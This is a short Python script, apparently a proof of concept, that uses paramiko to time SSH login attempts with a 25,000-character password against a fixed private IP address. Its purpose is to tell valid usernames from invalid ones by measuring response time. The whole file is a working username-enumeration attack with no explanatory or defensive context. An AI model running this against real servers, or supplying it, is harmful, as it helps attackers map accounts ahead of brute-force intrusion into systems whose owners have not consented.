#!/bin/python
 
import paramiko
import time
import sys
user = sys.argv[1]
p='A'*25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
         ssh.connect('192.168.4.231', username=user,
         password=p)
except:
         endtime=time.clock()
total=endtime-starttime
print(str(user)+ ": " +str(total))
